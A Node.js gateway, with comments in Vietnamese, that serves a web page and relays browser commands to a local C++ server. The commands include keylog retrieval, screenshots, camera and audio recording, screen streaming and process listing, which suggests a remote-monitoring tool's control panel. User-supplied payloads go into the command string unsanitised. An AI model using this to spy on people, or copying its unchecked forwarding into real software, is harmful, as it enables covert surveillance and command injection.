// gateway.js
import express from "express";
import http from "http";
import { WebSocketServer } from "ws";
import net from "net";
import path from "path";
import { fileURLToPath } from "url";

const WS_PORT = 8080;
const TCP_PORT = 9000;
const TCP_HOST = "127.0.0.1";

// === MOI: Dinh nghia cac "marker" cho file JPEG ===
const EOI = Buffer.from([0xff, 0xd9]); // End of Image
const SOI = Buffer.from([0xff, 0xd8]); // Start of Image

// --- Thiet lap Express (phuc vu file) ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const server = http.createServer(app);
app.use(express.static(path.join(__dirname, "public")));
console.log(`Dang phuc vu file tu: ${path.join(__dirname, "public")}`);

// --- Thiet lap WebSocket Server ---
const wss = new WebSocketServer({ server });

wss.on("connection", (ws, req) => {
  const clientIP = req.socket.remoteAddress;
  console.log(`[WS] Client ${clientIP} da ket noi.`);

  // --- MOI: Tao ket noi TCP vinh vien cho client nay ---
  const tcp = net.createConnection(TCP_PORT, TCP_HOST, () => {
    console.log(`[TCP] Da ket noi den C++ Server cho client ${clientIP}`);
    // Gui yeu cau tai thiet bi ngay khi ket noi
    tcp.write("GET_DEVICES\n");
  });

  let streamState = {
    isStreaming: false,
    isScreenStream: false,
    streamBuffer: Buffer.alloc(0), // <- Phai la Buffer
  };
  let textBuffer = "";

  // --- 2. XU LY DU LIEU TU SERVER C++ (TCP) GUI LEN ---
  tcp.on("data", (buffer) => {
    if (streamState.isStreaming) {
      // === 2A. XU LY STREAM MAN HINH (Logic 4-byte) ===
      if (streamState.isScreenStream) {
        streamState.streamBuffer = Buffer.concat([
          streamState.streamBuffer,
          buffer,
        ]);
        while (streamState.streamBuffer.length >= 4) {
          const frameSize = streamState.streamBuffer.readUInt32LE(0);
          if (streamState.streamBuffer.length >= frameSize + 4) {
            const frame = streamState.streamBuffer.slice(4, frameSize + 4);
            ws.send(frame);
            streamState.streamBuffer = streamState.streamBuffer.slice(
              frameSize + 4
            );
          } else {
            break;
          }
        }
      }
      // === 2B. XU LY STREAM CAMERA (MJPEG) ===
      else {
        streamState.streamBuffer = Buffer.concat([
          streamState.streamBuffer,
          buffer,
        ]);
        let eoiIndex;
        while ((eoiIndex = streamState.streamBuffer.indexOf(EOI)) !== -1) {
          const frameEnd = eoiIndex + 2;
          let frame = streamState.streamBuffer.slice(0, frameEnd);
          let soiIndex = frame.indexOf(SOI);
          if (soiIndex !== -1) {
            frame = frame.slice(soiIndex);
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(frame); // Gui 1 anh JPEG hoan chinh
            }
          }
          streamState.streamBuffer = streamState.streamBuffer.slice(frameEnd);
        }
      }
      return;
    }

    // --- Xu ly JSON (text) voi bo dem ---
    textBuffer += buffer.toString("utf-8");

    let newlineIndex;
    while ((newlineIndex = textBuffer.indexOf("\n")) >= 0) {
      const line = textBuffer.substring(0, newlineIndex).trim();
      textBuffer = textBuffer.substring(newlineIndex + 1);

      if (!line) continue;

      if (line === "STREAM_START") {
        streamState.isStreaming = true;
        if (streamState.isScreenStream) {
          streamState.streamBuffer = Buffer.alloc(0);
        }
        ws.send(JSON.stringify({ type: "stream_start" }));
        console.log(`[TCP->WS] STREAM_START`);
      } else if (line.startsWith("JSON ")) {
        const jsonPayload = line.substring(5);
        try {
          const data = JSON.parse(jsonPayload);

          let command = "UNKNOWN";
          if (data.log !== undefined) command = "GET_KEYLOG";
          else if (data.path !== undefined) command = "RECORD_VIDEO";
          else if (data.video !== undefined) command = "GET_DEVICES";
          else if (data.payload !== undefined) command = "GET_SCREENSHOT";
          else if (
            Array.isArray(data) &&
            data.length > 0 &&
            data[0] &&
            data[0].hwnd !== undefined
          )
            command = "GET_APPS";
          else if (
            Array.isArray(data) &&
            data.length > 0 &&
            data[0] &&
            data[0].exe !== undefined
          )
            command = "GET_PROCS";
          else if (Array.isArray(data))
            command = "GET_APPS"; // Mac dinh cho mang rong
          else if (data.ok) command = "COMMAND_OK";

          ws.send(
            JSON.stringify({
              type: "json",
              command: command,
              payload: command === "GET_SCREENSHOT" ? data.payload : data,
            })
          );
        } catch (e) {
          console.error(
            `[TCP->WS] Loi parse JSON: ${jsonPayload.substring(0, 80)}...`
          );
          console.error(`[TCP->WS] Message: ${e.message}`);
        }
      }
    } // Het while(textBuffer.indexOf)
  });

  // --- 3. XU LY LENH TU TRINH DUYET (WS) GUI XUONG ---
  ws.on("message", (data) => {
    const msg = JSON.parse(data.toString());

    // Reset stream
    streamState.isStreaming = false;
    // streamState.isScreenStream = false; // Se duoc set o duoi
    streamState.streamBuffer = Buffer.alloc(0);

    if (msg.command === "START_STREAM_SCREEN") {
      streamState.isScreenStream = true;
    } else if (msg.command === "START_STREAM_CAM") {
      streamState.isScreenStream = false;
    } else {
      streamState.isScreenStream = false;
    }

    // --- XOA: Khong can lenh STOP_STREAM ---

    // Chuyen tiep (proxy) lenh sang server C++
    let tcpCmd = msg.command;
    if (msg.payload) {
      if (msg.command === "RECORD_VIDEO") {
        tcpCmd += ` ${msg.payload.duration} "${msg.payload.cam}" "${msg.payload.audio}"`;
      } else if (msg.command === "START_STREAM_CAM") {
        tcpCmd += ` "${msg.payload.cam}" "${msg.payload.audio}"`;
      } else {
        tcpCmd += ` ${msg.payload}`;
      }
    }

    console.log(`[WS->TCP] Gui: ${tcpCmd}`);
    tcp.write(tcpCmd + "\n"); // Luon them \n
  });

  // 4. Dong bo ket noi
  ws.on("close", () => {
    console.log(`[WS] Client ${clientIP} da ngat ket noi.`);
    tcp.end();
  });

  // --- SUA LOI: XOA ws.close() KHOI tcp.on('close') ---
  tcp.on("close", () => {
    console.log("[TCP] Ket noi toi C++ da dong.");
    // KHONG DONG WEBSOCKET O DAY

    if (ws.readyState === WebSocket.OPEN) {
      ws.send(
        JSON.stringify({
          type: "error",
          payload: "Logic Server (C++) disconnected.",
        })
      );
    }
  });
  tcp.on("error", (err) => {
    console.error(`[TCP] Loi: ${err.message}`);
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: "error", payload: err.message }));
    }
  });
});

// --- KHOI DONG SERVER ---
server.listen(WS_PORT, () => {
  console.log(`HTTP Web Server dang chay tren http://localhost:${WS_PORT}`);
  console.log(`WebSocket Gateway dang chay tren ws://localhost:${WS_PORT}`);
  console.log(
    `Dang chuyen tiep toi Logic Server (C++) tai ${TCP_HOST}:${TCP_PORT}`
  );
});
